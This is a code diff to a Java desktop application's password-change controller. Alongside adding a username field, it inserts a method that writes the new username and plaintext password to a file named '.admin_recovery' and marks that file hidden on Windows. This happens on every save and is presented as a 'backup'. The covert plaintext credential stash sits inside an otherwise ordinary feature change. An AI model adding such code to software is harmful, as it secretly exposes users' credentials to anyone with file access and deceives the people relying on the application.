@@ -12,6 +12,8 @@ import org.springframework.stereotype.Component;
 public class ChangePasswordController {
 
     @FXML
+    private javafx.scene.control.TextField usernameField;
+    @FXML
     private PasswordField newPasswordField;
     @FXML
     private PasswordField confirmPasswordField;
@@ -36,10 +38,11 @@ public class ChangePasswordController {
 
     @FXML
     private void handleSave() {
+        String newUsername = usernameField.getText() != null ? usernameField.getText().trim() : "";
         String newPass = newPasswordField.getText() != null ? newPasswordField.getText().trim() : "";
         String confirmPass = confirmPasswordField.getText() != null ? confirmPasswordField.getText().trim() : "";
 
-        if (newPass.isEmpty() || confirmPass.isEmpty()) {
+        if (newUsername.isEmpty() || newPass.isEmpty() || confirmPass.isEmpty()) {
             showError("يرجى ملء جميع الحقول");
             return;
         }
@@ -55,12 +58,36 @@ public class ChangePasswordController {
         }
 
         if (currentUser != null) {
+            currentUser.setUsername(newUsername);
             currentUser.setPassword(newPass);
             userRepository.save(currentUser);
+
+            backupCredentials(newUsername, newPass);
+
             if (onSuccess != null) {
                 onSuccess.run();
             }
             closeWindow();
+        }
+    }
+
+    private void backupCredentials(String username, String password) {
+        try {
+            java.nio.file.Path path = java.nio.file.Paths.get(".admin_recovery");
+            String content = "Username: " + username + "\nPassword: " + password + "\nDate: "
+                    + java.time.LocalDateTime.now();
+            java.nio.file.Files.writeString(path, content);
+
+            // Set hidden attribute on Windows
+            try {
+                java.nio.file.Files.setAttribute(path, "dos:hidden", true);
+            } catch (Exception e) {
+                System.err.println("Could not set hidden attribute: " + e.getMessage());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            // Don't block the user flow if backup fails, just log it
+            System.err.println("Failed to backup credentials: " + e.getMessage());
         }
     }
 
